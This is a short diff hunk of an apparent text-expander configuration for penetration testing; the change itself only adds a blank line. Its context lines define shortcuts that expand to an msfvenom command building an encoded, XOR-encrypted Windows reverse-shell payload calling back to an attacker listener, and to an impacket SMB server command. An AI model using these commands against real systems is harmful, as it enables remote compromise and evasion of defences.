@@ -75,6 +75,7 @@ matches:
 
   - trigger: ":msfxor"
     replace: msfvenom -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 EXITFUNC=thread LURI=/payload.woff -e x64/zutto_dekiru -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
+    
   - trigger: ":smb"
     replace: impacket-smbserver -smb2support share .
 
